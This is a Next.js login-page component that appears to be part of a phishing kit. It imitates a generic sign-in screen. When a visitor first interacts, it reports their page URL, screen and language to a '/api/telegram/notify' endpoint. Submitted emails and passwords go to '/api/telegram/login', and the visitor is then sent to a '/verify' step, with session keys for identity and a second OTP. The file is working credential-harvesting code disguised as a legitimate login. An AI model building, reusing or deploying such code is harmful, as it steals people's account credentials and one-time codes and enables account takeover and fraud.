"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Eye, EyeOff } from "lucide-react"
import { FLORES_SESSION } from "@/lib/flores-flow"

export function FloresLoginPage() {
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [message, setMessage] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem(FLORES_SESSION.verify)
      sessionStorage.removeItem(FLORES_SESSION.identity)
      sessionStorage.removeItem(FLORES_SESSION.otp2)
    }
  }, [])

  useEffect(() => {
    let sent = false
    const onFirstInteraction = () => {
      if (sent) return
      sent = true

      const screen = `${window.screen.width}x${window.screen.height}`
      const language = navigator.language || navigator.languages?.[0] || "unknown"

      fetch("/api/telegram/notify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          event: "New Visitor",
          details: {
            pageUrl: window.location.href,
            screen,
            language,
          },
        }),
      }).catch((error) => {
        console.error("Failed to send visit notification:", error)
      })
    }

    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true })
    window.addEventListener("keydown", onFirstInteraction, { once: true })
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction)
      window.removeEventListener("keydown", onFirstInteraction)
    }
  }, [])

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    setMessage(null)

    if (!email.trim() || !password.trim() || isLoading) {
      if (!email.trim() || !password.trim()) {
        setMessage("Please enter both email and password.")
      }
      return
    }

    setIsLoading(true)

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId: email.trim(),
          password,
        }),
      })

      if (!response.ok) {
        setMessage("Unable to sign in. Please check your credentials and try again.")
        setIsLoading(false)
        return
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem(FLORES_SESSION.verify, "1")
      }
      router.push("/verify")
    } catch (error) {
      console.error("Failed to send login notification:", error)
      setMessage("Something went wrong. Please try again.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-linear-to-br from-[#f3f6fb] to-[#eef1f6] flex items-center justify-center px-4 sm:px-6">
      <div className="w-full max-w-md md:max-w-lg space-y-4">
        <div className="bg-white shadow-md p-6 sm:p-8">
          <div className="flex items-center gap-3 mb-6">
            <img src="/images.png" className="h-20" alt="" />
          </div>

          <form onSubmit={handleSubmit} noValidate>
            <input
              type="text"
              id="hp_field"
              tabIndex={-1}
              autoComplete="off"
              className="hidden"
            />

            <label htmlFor="loginEmail" className="sr-only">
              Email
            </label>
            <input
              id="loginEmail"
              type="email"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              autoComplete="username"
              placeholder="Email"
              className="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-2 text-sm sm:text-base mb-4"
            />

            <div className="relative mb-4">
              <label htmlFor="loginPassword" className="sr-only">
                Password
              </label>
              <input
                id="loginPassword"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(event) => setPassword(event.target.value)}
                placeholder="Password"
                className="w-full border-b border-gray-400 focus:border-blue-600 outline-none pr-10 text-sm sm:text-base"
              />
              <button
                type="button"
                onClick={() => setShowPassword((prev) => !prev)}
                aria-label={showPassword ? "Hide password" : "Show password"}
                className="absolute right-0 top-0 text-gray-600 hover:text-black"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>

            {message ? (
              <p id="message" className="text-sm text-red-600 mb-3">
                {message}
              </p>
            ) : (
              <p id="message" className="text-sm text-red-600 mb-3 hidden">
                &nbsp;
              </p>
            )}

            <p className="text-sm mb-6">
              <a href="#" className="text-blue-600 hover:underline">
                Forgot password?
              </a>
            </p>

            <div className="flex justify-end">
              <button
                type="submit"
                disabled={isLoading}
                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 w-full sm:w-auto"
              >
                {isLoading ? "Signing in..." : "Sign in"}
              </button>
            </div>
          </form>
        </div>

        <div className="flex flex-col sm:flex-row justify-end gap-2 sm:gap-4 text-xs text-gray-500 text-center sm:text-right">
          <a href="#" className="hover:underline">
            Terms of use
          </a>
          <a href="#" className="hover:underline">
            Privacy & cookies
          </a>
        </div>
      </div>
    </div>
  )
}
